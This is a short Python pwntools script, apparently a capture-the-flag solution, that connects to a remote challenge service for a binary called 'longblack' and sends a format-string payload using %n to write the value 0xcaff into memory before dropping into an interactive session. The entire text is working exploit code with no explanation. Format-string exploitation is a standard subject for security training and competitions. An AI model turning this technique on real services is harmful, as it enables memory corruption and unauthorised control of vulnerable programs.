#!/bin/python3
from pwn import *

r=remote('34.92.63.126',59002)

prog=ELF('./dist/longblack')

payload=b""
payload=f"%{int(0xcaff)}c%6$n"

r.sendlineafter('place your instruction here:',payload)

r.interactive()

